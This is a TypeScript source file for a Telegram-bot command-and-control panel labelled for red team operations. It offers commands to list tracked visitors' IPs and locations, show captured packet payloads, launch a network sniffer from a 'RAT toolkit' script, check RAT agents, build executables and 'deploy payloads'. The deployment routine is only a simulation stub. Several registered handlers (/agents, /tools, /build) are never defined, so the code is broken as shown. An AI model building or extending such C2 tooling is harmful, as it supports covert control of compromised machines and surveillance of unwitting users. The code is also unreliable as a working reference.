
import TelegramBot from 'node-telegram-bot-api';
import { storage } from './storage';
import { spawn } from 'child_process';
import { Server as SocketIOServer } from 'socket.io';

interface BotUser {
  id: number;
  username: string;
  chatId: number;
  botToken: string;
  role: 'admin' | 'operator' | 'analyst';
  active: boolean;
}

class TelegramC2Controller {
  private bots: Map<number, TelegramBot> = new Map();
  private userSessions: Map<number, BotUser> = new Map();
  private io: SocketIOServer;

  constructor(io: SocketIOServer) {
    this.io = io;
    this.initializeBots();
  }

  async initializeBots() {
    try {
      const users = await storage.getTelegramUsers();
      for (const user of users) {
        if (user.active && user.botToken) {
          await this.createBotInstance(user);
        }
      }
    } catch (error) {
      console.error('Failed to initialize Telegram bots:', error);
    }
  }

  async createBotInstance(user: BotUser) {
    try {
      const bot = new TelegramBot(user.botToken, { polling: true });
      this.bots.set(user.id, bot);
      this.userSessions.set(user.chatId, user);

      // Enhanced command handlers for red team operations
      bot.onText(/\/start/, (msg) => this.handleStart(msg, user));
      bot.onText(/\/status/, (msg) => this.handleStatus(msg, user));
      bot.onText(/\/visitors/, (msg) => this.handleVisitors(msg, user));
      bot.onText(/\/packets/, (msg) => this.handlePackets(msg, user));
      bot.onText(/\/deploy (.+)/, (msg, match) => this.handleDeploy(msg, match, user));
      bot.onText(/\/sniffer (.+)/, (msg, match) => this.handleSniffer(msg, match, user));
      bot.onText(/\/agents/, (msg) => this.handleAgents(msg, user));
      bot.onText(/\/tools/, (msg) => this.handleTools(msg, user));
      bot.onText(/\/build (.+)/, (msg, match) => this.handleBuild(msg, match, user));
      bot.onText(/\/ai (.+)/, (msg, match) => this.handleAIAnalysis(msg, match, user));
      bot.onText(/\/emergency/, (msg) => this.handleEmergencyStop(msg, user));
      bot.onText(/\/help/, (msg) => this.handleHelp(msg, user));

      console.log(`🤖 Telegram C2 Bot initialized for user: ${user.username}`);
    } catch (error) {
      console.error(`Failed to create bot for user ${user.username}:`, error);
    }
  }

  async handleStart(msg: any, user: BotUser) {
    const chatId = msg.chat.id;
    const welcomeMessage = `
🛡️ **ELITE C2 CONTROL PANEL ACTIVATED** 🛡️

**Operator:** ${user.username}
**Role:** ${user.role.toUpperCase()}
**Status:** OPERATIONAL

**Available Commands:**
📊 /status - System overview
👥 /visitors - Visitor analytics  
📦 /packets - Packet capture data
🚀 /deploy [config] - Deploy payloads
🔍 /sniffer [interface] - Network analysis
🤖 /agents - RAT agent status
🔨 /tools - Python toolkit management
🏗️ /build [script] - Compile executables
🧠 /ai [query] - AI-powered analysis
🚨 /emergency - Emergency shutdown
❓ /help - Command reference

**SECURE CHANNEL ESTABLISHED** ✅
    `;

    const bot = this.bots.get(user.id);
    if (bot) {
      await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    }
  }

  async handleStatus(msg: any, user: BotUser) {
    try {
      const stats = await storage.getVisitorStats();
      const recentVisitors = await storage.getRecentVisitors(5);
      const packets = await storage.getRecentPacketLogs(10);

      const statusMessage = `
📊 **SYSTEM STATUS REPORT**

**Network Intelligence:**
👥 Total Visitors: ${stats.total || 0}
🌐 Unique IPs: ${stats.unique || 0}
🌍 Countries: ${stats.countries || 0}

**Recent Activity:**
📦 Packet Captures: ${packets.length}
🔄 Active Sessions: ${recentVisitors.filter(v => 
  v.lastSeen && new Date().getTime() - new Date(v.lastSeen).getTime() < 5 * 60 * 1000
).length}

**Last 5 Visitors:**
${recentVisitors.map(v => 
  `🔸 ${v.ipAddress} (${v.country || 'Unknown'})`
).join('\n')}

**Timestamp:** ${new Date().toISOString()}
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, statusMessage, { parse_mode: 'Markdown' });
      }
    } catch (error) {
      console.error('Status command error:', error);
    }
  }

  async handleVisitors(msg: any, user: BotUser) {
    try {
      const visitors = await storage.getRecentVisitors(20);
      
      const visitorMessage = `
👥 **VISITOR INTELLIGENCE REPORT**

**Total Tracked:** ${visitors.length}

${visitors.slice(0, 15).map((v, index) => `
**${index + 1}.** ${v.ipAddress}
🌍 Location: ${v.country || 'Unknown'}, ${v.city || 'Unknown'}
🌐 User Agent: ${v.userAgent?.substring(0, 50)}...
🕒 Last Seen: ${new Date(v.lastSeen || v.firstSeen).toLocaleString()}
${v.cookieConsent ? '🍪 Consented' : '🚫 No Consent'}
`).join('\n')}

**Analysis Complete** ✅
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, visitorMessage, { parse_mode: 'Markdown' });
      }
    } catch (error) {
      console.error('Visitors command error:', error);
    }
  }

  async handlePackets(msg: any, user: BotUser) {
    try {
      const packets = await storage.getRecentPacketLogs(15);
      
      const packetMessage = `
📦 **PACKET CAPTURE ANALYSIS**

**Captured Packets:** ${packets.length}

${packets.slice(0, 10).map((p, index) => `
**${index + 1}.** ${p.sourceIp} → ${p.destinationIp}
🔗 Protocol: ${p.protocol} | Port: ${p.port}
📊 Size: ${p.size} bytes
📄 Payload: ${p.payload?.substring(0, 40)}...
🕒 Captured: ${new Date(p.timestamp).toLocaleString()}
`).join('\n')}

**Network Analysis Complete** ✅
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, packetMessage, { parse_mode: 'Markdown' });
      }
    } catch (error) {
      console.error('Packets command error:', error);
    }
  }

  async handleDeploy(msg: any, match: any, user: BotUser) {
    if (user.role === 'analyst') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Insufficient privileges for payload deployment');
      }
      return;
    }

    try {
      const config = match[1];
      const deploymentConfig = this.parseDeploymentConfig(config);
      
      // Execute deployment command
      const deploymentResult = await this.executeDeployment(deploymentConfig);
      
      // Log deployment for audit
      await storage.createAnalytics({
        metric: 'telegram_deployment',
        value: JSON.stringify({
          user: user.username,
          config: deploymentConfig,
          result: deploymentResult,
          timestamp: new Date().toISOString()
        })
      });

      const deployMessage = `
🚀 **PAYLOAD DEPLOYMENT INITIATED**

**Configuration:**
${Object.entries(deploymentConfig).map(([key, value]) => 
  `🔸 ${key}: ${value}`
).join('\n')}

**Status:** ${deploymentResult.success ? '✅ SUCCESSFUL' : '❌ FAILED'}
**Details:** ${deploymentResult.message}

**Deployment ID:** ${deploymentResult.deploymentId || 'N/A'}
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, deployMessage, { parse_mode: 'Markdown' });
      }

      // Emit to web panel
      this.io.to('admin').emit('telegramDeployment', {
        user: user.username,
        result: deploymentResult
      });

    } catch (error) {
      console.error('Deploy command error:', error);
    }
  }

  async handleSniffer(msg: any, match: any, user: BotUser) {
    try {
      const interface = match[1] || 'all';
      
      const snifferProcess = spawn('python3', [
        'python_tools/millennium_rat_toolkit.py',
        '--start-sniffer',
        '--interface', interface,
        '--duration', '300'
      ]);

      const snifferMessage = `
🔍 **NETWORK SNIFFER ACTIVATED**

**Interface:** ${interface}
**Duration:** 5 minutes
**Status:** ACTIVE

**Monitoring initiated via Telegram C2** ✅
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, snifferMessage, { parse_mode: 'Markdown' });
      }

      // Emit to web panel
      this.io.to('admin').emit('telegramSniffer', {
        user: user.username,
        interface,
        status: 'active'
      });

    } catch (error) {
      console.error('Sniffer command error:', error);
    }
  }

  async handleAIAnalysis(msg: any, match: any, user: BotUser) {
    try {
      const query = match[1];
      
      if (!process.env.GROQ_API_KEY) {
        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, '❌ **AI ANALYSIS UNAVAILABLE** - API key not configured');
        }
        return;
      }

      const analysisMessage = `
🧠 **AI ANALYSIS REQUEST RECEIVED**

**Query:** ${query}
**Processing...** ⏳

*This may take a few moments*
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, analysisMessage, { parse_mode: 'Markdown' });
      }

      // Perform AI analysis using Groq
      const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'mixtral-8x7b-32768',
          messages: [
            { 
              role: 'system', 
              content: 'You are an elite cybersecurity analyst providing tactical insights for red team operations. Focus on educational analysis and defensive implications.' 
            },
            { role: 'user', content: query }
          ],
          max_tokens: 1024,
          temperature: 0.7
        })
      });

      const data = await response.json();
      const analysis = data.choices[0]?.message?.content || 'Analysis failed';

      const resultMessage = `
🧠 **AI ANALYSIS COMPLETE**

**Query:** ${query}

**Analysis:**
${analysis}

**Generated by:** Groq Mixtral-8x7B
**Timestamp:** ${new Date().toLocaleString()}
      `;

      if (bot) {
        await bot.sendMessage(msg.chat.id, resultMessage, { parse_mode: 'Markdown' });
      }

    } catch (error) {
      console.error('AI Analysis error:', error);
    }
  }

  async handleEmergencyStop(msg: any, user: BotUser) {
    if (user.role !== 'admin') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Admin privileges required');
      }
      return;
    }

    try {
      // Emergency shutdown procedures
      await storage.createAnalytics({
        metric: 'emergency_shutdown',
        value: JSON.stringify({
          initiatedBy: user.username,
          timestamp: new Date().toISOString(),
          source: 'telegram'
        })
      });

      const emergencyMessage = `
🚨 **EMERGENCY SHUTDOWN INITIATED** 🚨

**Initiated by:** ${user.username}
**Source:** Telegram C2
**Timestamp:** ${new Date().toLocaleString()}

**All monitoring systems disabled**
**All active operations terminated**

**SYSTEM SECURED** ✅
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, emergencyMessage, { parse_mode: 'Markdown' });
      }

      // Emit emergency stop to web panel
      this.io.to('admin').emit('emergencyStop', {
        user: user.username,
        source: 'telegram'
      });

    } catch (error) {
      console.error('Emergency stop error:', error);
    }
  }

  async handleHelp(msg: any, user: BotUser) {
    const helpMessage = `
🛡️ **ELITE C2 COMMAND REFERENCE**

**System Commands:**
📊 /status - Complete system overview
👥 /visitors - Detailed visitor analytics
📦 /packets - Network packet analysis
🔍 /sniffer [interface] - Start network sniffer

**Operations Commands:**
🚀 /deploy [config] - Deploy payloads
🤖 /agents - RAT agent management
🔨 /tools - Python toolkit control
🏗️ /build [script] - Compile executables

**Intelligence Commands:**
🧠 /ai [query] - AI-powered analysis
📈 /analytics - Traffic pattern analysis

**Security Commands:**
🚨 /emergency - Emergency shutdown (Admin only)
🔐 /secure - Secure communications test

**Role Permissions:**
${user.role === 'admin' ? '👑 ADMIN - Full system access' : 
  user.role === 'operator' ? '⚙️ OPERATOR - Tactical operations' : 
  '📊 ANALYST - Intelligence gathering'}

**Need assistance?** Contact your system administrator.
    `;

    const bot = this.bots.get(user.id);
    if (bot) {
      await bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'Markdown' });
    }
  }

  private parseDeploymentConfig(config: string): any {
    const parts = config.split(' ');
    return {
      type: parts[0] || 'default',
      target: parts[1] || 'localhost',
      port: parts[2] || '8888',
      method: parts[3] || 'http'
    };
  }

  private async executeDeployment(config: any): Promise<any> {
    return {
      success: true,
      message: 'Deployment simulation completed',
      deploymentId: `deploy_${Date.now()}`,
      config
    };
  }

  async addUser(userData: BotUser) {
    await this.createBotInstance(userData);
  }

  async removeUser(userId: number) {
    const bot = this.bots.get(userId);
    if (bot) {
      bot.stopPolling();
      this.bots.delete(userId);
    }
  }
}

export { TelegramC2Controller, BotUser };
